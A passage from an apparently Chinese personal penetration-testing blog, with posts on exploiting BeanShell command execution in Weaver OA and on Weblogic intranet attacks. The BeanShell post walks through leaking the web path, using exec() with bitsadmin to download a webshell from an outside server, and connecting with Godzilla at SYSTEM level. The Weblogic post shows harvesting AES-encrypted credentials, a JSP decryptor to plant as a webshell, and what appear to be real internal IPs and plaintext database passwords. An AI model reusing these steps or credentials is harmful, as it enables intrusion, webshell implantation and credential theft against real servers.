        <h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>存储在内容中，易损性。程序运行后会加载到内存中。</p>
<h2 id="内存提取技术"><a href="#内存提取技术" class="headerlink" title="内存提取技术"></a>内存提取技术</h2><p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility">工具</a>：volatility</p>
<p>待填坑</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clcpy5als000borhfgouh8z4e" data-title="内存取证初识（一）" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-BeanShell任意命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="dt-published" datetime="2022-11-26T02:26:33.000Z" itemprop="datePublished">2022-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">BeanShell任意命令执行</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a></p>
<h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>他是Java语法规范的脚本语言，可以用来执行他本身预设的命令和函数，正因为那些命令和函数，攻击者可以构造有威胁的命令，对信息系统造成威胁。</p>
<h2 id="哪些适用（规则）"><a href="#哪些适用（规则）" class="headerlink" title="哪些适用（规则）"></a>哪些适用（规则）</h2><p>uri带有以下内容，我这里举例子的是关于OA的uri</p>
<ul>
<li>&#x2F;weaver&#x2F;bsh.servlet.BshServlet</li>
<li>&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet</li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>具体更多玩法看<a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a>，以下使用简单的exec() dir()函数作为样例。</p>
<h4 id="查看当前目录，并找到web目录"><a href="#查看当前目录，并找到web目录" class="headerlink" title="查看当前目录，并找到web目录"></a>查看当前目录，并找到web目录</h4><ol>
<li>dir(“&#x2F;sdfasf”) 输入让他报错，就能返回当前路径;<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></li>
<li>这里就是web的根目录，绝对路径为”D:\weaver\ecology”；<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></li>
</ol>
<h2 id="写shell😈"><a href="#写shell😈" class="headerlink" title="写shell😈"></a>写shell😈</h2><p>现在我们已经知道了web的绝对路径，我们就可以尝试写入webshell，更方便我们利用该漏洞。你可以使用echo写入，也可以远程下载，我这里使用的是远程下载方法。</p>
<ol>
<li>在实战过程中，你需要将webshell放置到云vps中，并且启动一个webserver，让受害者可以http形式访问到并且下载木马，输入以下指令到Script框中并执行。Output中没有报错证明指令执行成功。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:8000/2.jsp d:\\weaver\\ecology\\123.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
<img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></li>
</ol>
<h2 id="连shell"><a href="#连shell" class="headerlink" title="连shell"></a>连shell</h2><p>连接取决于你使用的什么webshell，如果你用一句话webshell那么可以使用蚁剑、菜刀等工具，我这里使用的是哥斯拉。如下图输入webshell的url和连接密码之后测试成功之后证明你的木马上传成功了，可以连接到webshel尽情玩耍了😄。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
<h2 id="用shell"><a href="#用shell" class="headerlink" title="用shell"></a>用shell</h2><p>我这里使用哥斯拉试一个简单的命令，whoami查看当前权限，看到为system权限。权限比较高，可以继续对该站点内网进行渗透省着提权了👏。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
<h2 id="小tips（还会更新）"><a href="#小tips（还会更新）" class="headerlink" title="小tips（还会更新）"></a>小tips（还会更新）</h2><p>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clcpy5alo0001orhf70gmann2" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Weblogic内网渗透tips" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" class="article-date">
  <time class="dt-published" datetime="2022-11-24T01:56:48.000Z" itemprop="datePublished">2022-11-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/">Weblogic内网渗透tips</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="ping-8-8-8-8出网，但是c2不出网？"><a href="#ping-8-8-8-8出网，但是c2不出网？" class="headerlink" title="ping 8.8.8.8出网，但是c2不出网？"></a>ping 8.8.8.8出网，但是c2不出网？</h2><h1 id="weblogic技战法"><a href="#weblogic技战法" class="headerlink" title="weblogic技战法"></a>weblogic技战法</h1><p>当可以对weblogic文件读取、命令执行后,可以采取上传webshell等操作.本次内容主要应对想登陆weblogic后台等情况,可以采取读取系统配置的密码并解密登陆后台进行后续攻击.</p>
<h2 id="拿到加密密码"><a href="#拿到加密密码" class="headerlink" title="拿到加密密码"></a>拿到加密密码</h2><ol>
<li>执行命令: grep -R “{AES}” ,并读取{AES}…………部分.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[oracle@47be61a62209 base_domain]$ grep -R <span class="string">&quot;&#123;AES&#125;&quot;</span></span><br><span class="line">config/config.xml:    &lt;credential-encrypted&gt;&#123;AES&#125;4lF4nqZWkUJ4567ypRjhXouID15EikshgwXlTn2XBCbSFIfSzkMNn4/wvML3f1r0LLZAggmORlI9EyF+U1GrUYwFoazvYq648/zPhHkyYl2R5OPhoEJcoe3olR3IiZ/U&lt;/credential-encrypted&gt;</span><br><span class="line">config/config.xml:    &lt;node-manager-password-encrypted&gt;&#123;AES&#125;aMj627ml8lP6TAGipIu47rFwThbsAYyHy44DkIJTgLs=&lt;/node-manager-password-encrypted&gt;</span><br><span class="line">config/config.xml:    &lt;credential-encrypted&gt;&#123;AES&#125;2jZbC6NiWNI96lMC0S+3Ppq8uPUqT2Yi5JnVBfxVEvlJEQrQ82HzRmW0yYJRVF0y&lt;/credential-encrypted&gt;</span><br><span class="line">init-info/config-nodemanager.xml:  &lt;nod:password&gt;&#123;AES&#125;bDqxjLcpNOJLpJ8GnDu5bv/4ToyZfs1i7GNjkUZG2a0=&lt;/nod:password&gt;</span><br><span class="line">servers/AdminServer/security/boot.properties:password=&#123;AES&#125;errqUDU4uv837h/rxdpGici4JPpsn+2fZpQRxnHhXYs\=</span><br><span class="line">servers/AdminServer/security/boot.properties:username=&#123;AES&#125;4l2uRcGscFsr0aS4MGTASdVDAZ8nGX8+72ODo8gK2k8\=</span><br><span class="line">edit.lok:creator=&#123;AES&#125;egG3ZQivBJDRKD5IboKoo6orcdYWHtLNYke3ik8FDfA\=</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol>
<li>wlfullclient.jar and jarbuilder are deprecated starting from the WebLogic 12.1.3 release.</li>
</ol>
<h2 id="登陆weblogic后台"><a href="#登陆weblogic后台" class="headerlink" title="登陆weblogic后台"></a>登陆weblogic后台</h2><p>weblogic 在线与离线解密<br>如有webshell可进行在线解密<br>把以下代码放入服务器进行访问，s&#x3D;””中填写weblogic的加密密码，可在boot.properties文件中找到。默认路径为..&#x2F;..&#x2F;..&#x2F;Server&#x2F;security&#x2F;boot.properties</p>
<p>#Sat Mar 31 19:36:34 CST 2018<br>password&#x3D;{AES}B5azehvTFE00Ln88jynWCZq+Srddca7MYHEswtxwtBs=<br>username&#x3D;{AES}y47BedaLa4o2qU7v+sJZizMOVghLhxaWXFjwj8vCFf8=</p>
<p>#Tue Jan 08 17:37:06 CST 2019<br>password&#x3D;{AES}xt7IIkDgw29&#x2F;KqQEJY&#x2F;A0VVR&#x2F;M0UBHEk&#x2F;PLVQDo9Gkg=<br>username&#x3D;{AES}ThYjAwTUtX&#x2F;DUpLXfPO6bsVib&#x2F;Kmze&#x2F;aG2o6EPHpxgI=</p>
<h4 id="搜索Jsp可执行目录"><a href="#搜索Jsp可执行目录" class="headerlink" title="搜索Jsp可执行目录"></a>搜索Jsp可执行目录</h4><ol>
<li>find &#x2F; -type f -name login.css 并放置webshell</li>
<li><a target="_blank" rel="noopener" href="http://8.8.8.8:9001/console/css/login.jsp">http://8.8.8.8:9001/console/css/login.jsp</a><br>login.jsp内容<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weblogic.security.internal.*,weblogic.security.internal.encryption.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   <span class="type">EncryptionService</span> <span class="variable">es</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">ClearOrEncryptedService</span> <span class="variable">ces</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    s= request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    es = SerializedSystemIni.getEncryptionService();</span><br><span class="line">    <span class="keyword">if</span> (es == <span class="literal">null</span>) &#123;</span><br><span class="line">       out.println(<span class="string">&quot;Unable to initialize encryption service&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ces = <span class="keyword">new</span> <span class="title class_">ClearOrEncryptedService</span>(es);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;\nDecrypted Password is:&quot;</span> + ces.decrypt(s));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>10.103.102.140</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdbc-data-source</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/jdbc-data-source&quot;</span> <span class="attr">xmlns:sec</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/security&quot;</span> <span class="attr">xmlns:wls</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/security/wls&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.oracle.com/weblogic/jdbc-data-source http://xmlns.oracle.com/weblogic/jdbc-data-source/1.2/jdbc-data-source.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mdm<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-driver-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:oracle:thin:@(DESCRIPTION =    (ADDRESS = (PROTOCOL = TCP)(HOST = 10.103.102.140)(PORT = 1521))    (CONNECT_DATA =      (SERVER = DEDICATED)      (SERVICE_NAME = sydevpdb)    ))<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">driver-name</span>&gt;</span>oracle.jdbc.OracleDriver<span class="tag">&lt;/<span class="name">driver-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>MS_MDM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password-encrypted</span>&gt;</span>&#123;AES&#125;EqQfdzHrlqR2lg/wH6FPmpOB4ZpPVp1CuMzJZIZfvr4=<span class="tag">&lt;/<span class="name">password-encrypted</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-driver-params</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-connection-pool-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test-table-name</span>&gt;</span>SQL SELECT 1 FROM DUAL<span class="tag">&lt;/<span class="name">test-table-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-connection-pool-params</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdbc-data-source-params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jndi-name</span>&gt;</span>ls/uap/ms_mdm<span class="tag">&lt;/<span class="name">jndi-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">global-transactions-protocol</span>&gt;</span>OnePhaseCommit<span class="tag">&lt;/<span class="name">global-transactions-protocol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdbc-data-source-params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jdbc-data-source</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据配置文件获取链接参数<br>    database:sydevpdb<br>    username:ms_mdm<br>    password:MS_MDM_test#1</p>
<p>MS_ARC&#x2F;MS_ARC_test#1<br>LSPF_I18N&#x2F;LSPF_I18N_test#1<br>bsp&#x2F;bsp_test#1<br>LSPF_SUPPORT&#x2F;LSPF_SUPPORT_test#1</p>
<p>密码目：&#x2F;u01&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;domainsy&#x2F;init-info&#x2F;security.xml</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" data-id="clcpy5alr0008orhf4w4t4ud6" data-title="Weblogic内网渗透tips" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-BurpSuite插件开发" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" class="article-date">
  <time class="dt-published" datetime="2022-11-22T04:46:38.000Z" itemprop="datePublished">2022-11-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">BurpSuite插件开发</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li>IDEA</li>
<li>JDK</li>
<li>BurpSuite,简称Burp</li>
</ol>
<h2 id="环境调试"><a href="#环境调试" class="headerlink" title="环境调试"></a>环境调试</h2><p>idea新建并启动一个gradle项目,因为开发过程需要使用Burp提供的接口,需要先配置一个依赖添加,implementation ‘net.portswigger.burp.extender:burp-extender-api:2.3’到文件build.gradle中,前两个可以暂时不用动.</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    testImplementation <span class="string">&#x27;org.junit.jupiter:junit-jupiter-api:5.8.1&#x27;</span></span><br><span class="line">    testRuntimeOnly <span class="string">&#x27;org.junit.jupiter:junit-jupiter-engine:5.8.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;net.portswigger.burp.extender:burp-extender-api:2.3&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编辑好后重启加载gradle即可.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clcpy5alm0000orhfhtaffmfs" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/01/10/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5Public-Key-Retrieval-is-not-allowed/">Mysql数据库连接Public Key Retrieval is not allowed</a>
          </li>
        
          <li>
            <a href="/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">Spring Boot漏洞分析与利用</a>
          </li>
        
          <li>
            <a href="/2022/12/25/Buuctf-Secret-File/">Buuctf-Secret File</a>
          </li>
        
          <li>
            <a href="/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">CVE-2020-1472复现分析</a>
          </li>
        
          <li>
            <a href="/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/">Bluetooth抓包分析初识</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 Dhayser Li<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>